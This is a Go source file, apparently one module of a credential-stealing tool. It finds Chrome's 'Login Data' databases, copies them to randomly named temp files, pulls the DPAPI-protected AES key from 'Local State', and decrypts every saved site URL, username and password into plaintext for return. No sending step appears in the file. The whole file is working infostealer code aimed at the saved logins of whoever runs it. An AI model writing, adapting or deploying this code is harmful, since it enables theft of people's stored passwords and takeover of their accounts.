package components

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"sync"

	_ "github.com/mattn/go-sqlite3"
	"github.com/zavla/dpapi"
)

func GetChromePasswords(res chan<- []PasswordModel) {
	passwords := []PasswordModel{}
	basePath := filepath.Join(os.Getenv("localappdata"), "Google", "Chrome", "User Data")
	if dir, err := os.Stat(basePath); err != nil || !dir.IsDir() {
		res <- passwords
		return
	}

	var wg sync.WaitGroup
	if err := filepath.Walk(basePath, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}
		if strings.ToLower(info.Name()) == "login data" {
			wg.Add(1)
			go func() {
				defer wg.Done()
				temppath := filepath.Join(os.Getenv("temp"), generateRandomString(5))
				if err := copyFile(path, temppath); err != nil {
					return
				}
				defer os.Remove(temppath)

				db, err := sql.Open("sqlite3", temppath)
				if err != nil {
					return
				}
				defer db.Close()

				rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
				if err != nil {
					return
				}
				defer rows.Close()

				for rows.Next() {
					var url, username string
					var password []byte

					if err := rows.Scan(&url, &username, &password); err != nil {
						return
					}

					password, err = decryptChromeData(password)
					if err != nil {
						return
					}

					if url != "" && username != "" && len(password) != 0 {
						passwords = append(passwords, PasswordModel{
							URL:      url,
							Username: username,
							Password: string(password),
						})
					}
				}

			}()
		}
		return nil
	}); err != nil {
		res <- passwords
		return
	}
	wg.Wait()
	res <- passwords
}

func decryptChromeData(encryptedData []byte) ([]byte, error) {
	key, err := getChromeEncryptionKey()
	if err != nil {
		return nil, err
	}

	if len(encryptedData) < 16 {
		return nil, errors.New("encrypted data too short")
	}

	iv := encryptedData[3:15]
	encryptedData = encryptedData[15:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	GCMcipher, err := cipher.NewGCM(block)
	if err != nil {
		return nil, nil
	}

	decryptedData, err := GCMcipher.Open(nil, iv, encryptedData, nil)
	if err != nil {
		return nil, err
	}

	return decryptedData, nil
}

func getChromeEncryptionKey() ([]byte, error) {
	basePath := filepath.Join(os.Getenv("localappdata"), "Google", "Chrome", "User Data")
	if dir, err := os.Stat(basePath); err != nil || !dir.IsDir() {
		return nil, errors.New("browser not found")
	}

	localStatePath := filepath.Join(basePath, "Local State")

	file, err := os.Open(localStatePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	content, _ := io.ReadAll(file)

	var tree map[string]any

	if err := json.Unmarshal(content, &tree); err != nil {
		return nil, err
	}

	if os_crypt, ok := tree["os_crypt"]; ok {

		os_crypt := os_crypt.(map[string]any)

		if key, ok := os_crypt["encrypted_key"]; ok {

			encryptionKey, err := base64.StdEncoding.DecodeString(key.(string))
			if err != nil {
				return nil, err
			}

			encryptionKey = encryptionKey[5:]
			encryptionKey, err = dpapi.Decrypt(encryptionKey)
			if err != nil {
				return nil, err
			}

			return encryptionKey, nil
		}
		return nil, errors.New("key `encrypted_key` not found")
	}
	return nil, errors.New("key `os_crypt` not found")
}
